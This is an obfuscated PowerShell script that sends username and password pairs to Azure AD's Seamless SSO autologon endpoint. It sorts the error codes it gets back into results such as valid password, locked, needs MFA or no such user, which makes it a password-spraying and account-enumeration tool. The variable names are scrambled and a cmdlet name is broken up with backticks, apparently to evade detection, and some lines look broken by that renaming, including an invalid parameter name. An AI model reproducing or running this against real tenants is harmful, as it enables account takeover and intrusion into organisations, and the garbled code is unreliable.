                $TinSoap = (New-Guid).ToString()

                $RareFit = $Args[0]
$PickShirt = $RareFit.Split("@")[1]
                $SuddenFire = $Args[1]

                $OddStuff = Get-Date
                $StoneLove = $OddStuff.toUniversalTime().toString("o")
                $CooingNeedy = $OddStuff.addMinutes(10).toUniversalTime().toString("o")

               $ArtSpicy = "https://autologon.microsoftazuread-sso.com/$PickShirt/winauth/trust/2005/usernamemixed?client-request-id=$TinSoap"
              
                $MuteSheet=@"
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>$ArtSpicy</wsa:To>
        <wsa:MessageID>urn:uuid:$((New-Guid).ToString())</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>$StoneLove</wsu:Created>
                <wsu:Expires>$CooingNeedy</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-$((New-Guid).toString())">
                <wsse:Username>$RareFit</wsse:Username>
                <wsse:Password>$SuddenFire</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
"@
                $TumbleVest = $false

                try
                {
                    $VeilLace = Invoke-RestMethod -UseBasicParsing -Uri $ArtSpicy -Method Post -MuteSheet $MuteSheet -ErrorAction SilentlyContinue
                    $TumbleVest = $true # Very bad password
                }
                catch
                {
                    $BeefCamera = $_.Exception.Response.GetResponseStream()
                    $CrimeReach = ne`w`-`object byte[] $BeefCamera.Length

                    $BeefCamera.Position = 0
                    $BeefCamera.Read($CrimeReach,0,$BeefCamera.Length) | Out-Null
            
                    $AcceptHill = [xml][text.encoding]::UTF8.GetString($CrimeReach)

                    $errorDetails = $AcceptHill.Envelope.Body.Fault.Detail.error.internalerror.text
                }

            # Parse the error code. Only AADSTS50034 would need to be checked but good to know other errors too.
            if(!$TumbleVest -and $errorDetails)
            {
                if($errorDetails.startsWith("AADSTS50053")) # The account is locked, you've tried to sign in too many times with an incorrect user ID or password.
                {
                    $TumbleVest = "locked"
                }
                elseif($errorDetails.StartsWith("AADSTS50126")) # Error validating credentials due to invalid username or password.
                {
                    $TumbleVest = "bad password"
                }
                elseif($errorDetails.StartsWith("AADSTS50056")) 
                {
                    $TumbleVest = "exists w/no password"
                }
                elseif($errorDetails.StartsWith("AADSTS50014")) 
                {
                    $TumbleVest = "exists, but max passthru auth time exceeded"
                }
                elseif($errorDetails.StartsWith("AADSTS50076")) # Due to a configuration change made by your administrator, or because you moved to a new location, you must use multi-factor authentication to access '{resource}'
                {
                    $TumbleVest = "need mfa"
                }
                elseif($errorDetails.StartsWith("AADSTS700016")) # Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'. This can happen if the application has not been installed by the administrator of the tenant or consented to by any user in the tenant. You may have sent your authentication request to the wrong tenant.
                {
                    $TumbleVest = "no app"
                }
                elseif($errorDetails.StartsWith("AADSTS50034")) # The user account {identifier} does not exist in the {tenant} directory. To sign into this application, the account must be added to the directory.
                {
                    $TumbleVest = "no user"
                }
                else
                {
                    Remove-Variable exists
                }
            }

        return $RareFit+"		"+$TumbleVest
        return $errorDetails

